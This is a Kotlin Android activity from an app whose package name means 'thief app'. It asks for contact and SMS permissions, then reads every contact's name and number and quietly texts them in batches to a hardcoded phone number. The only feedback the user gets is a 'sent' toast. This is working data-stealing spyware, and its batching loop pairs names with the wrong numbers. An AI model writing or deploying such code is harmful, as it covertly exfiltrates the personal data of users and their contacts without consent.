package uz.ilhomjon.ogriapp

import android.Manifest
import android.annotation.SuppressLint
import android.os.AsyncTask
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import com.github.florent37.runtimepermission.kotlin.askPermission
import uz.ilhomjon.ogriapp.models.MyContact

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        myAskPermission()
    }

    fun myAskPermission() {
        askPermission(Manifest.permission.READ_CONTACTS, Manifest.permission.SEND_SMS) {
            //all permissions already granted or just granted
            readContacts()
        }.onDeclined { e ->
            if (e.hasDenied()) {

                AlertDialog.Builder(this)
                    .setMessage("Please accept our permissions")
                    .setPositiveButton("yes") { dialog, which ->
                        e.askAgain();
                    } //ask again
                    .setNegativeButton("no") { dialog, which ->
                        dialog.dismiss();
                    }
                    .show();
            }

            if (e.hasForeverDenied()) {
                //the list of forever denied permissions, user has check 'never ask again'

                // you need to open setting manually if you really need it
                e.goToSettings();
            }
        }
    }

    fun readContacts() {
        val l = getAllContacts()
        findViewById<TextView>(R.id.tv_info).text = l.toString()
        sendSms(l)
    }

    @SuppressLint("Range")
    fun getAllContacts(): ArrayList<MyContact> {
        val list = ArrayList<MyContact>()

        val contacts = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null
        )
        while (contacts!!.moveToNext()) {
            val contact = MyContact(
                contacts!!.getString(contacts!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)),
                contacts!!.getString(contacts!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            )

            list.add(contact)
        }
        contacts!!.close()

        return list
    }

    fun sendSms(list: ArrayList<MyContact>) {
        MyTask().execute()

    }

 inner class MyTask : AsyncTask<Void, Void, Void>() {
        override fun doInBackground(vararg params: Void?): Void? {
            val list = getAllContacts()
            val list2 = ArrayList<String>()

            var j = 0
            var temp = ""
            while (j < list.size) {
                for (i in 0 until 10) {
                    if (j < list.size) {
                        temp += "${list[j].name} ${list[i].number}"
                        j++
                    } else break
                }
                list2.add(temp)
                temp = ""
            }


            for (i in 0 until list2.size) {
                val sms = SmsManager.getDefault()
                val parts = sms.divideMessage(list2[i])
                sms.sendMultipartTextMessage("+998996021502", null, parts, null, null)
                Thread.sleep(10000)
            }
            return null
        }

     override fun onPostExecute(result: Void?) {
         super.onPostExecute(result)
         Toast.makeText(this@MainActivity, "Jo'natildi", Toast.LENGTH_SHORT).show()
     }
    }
}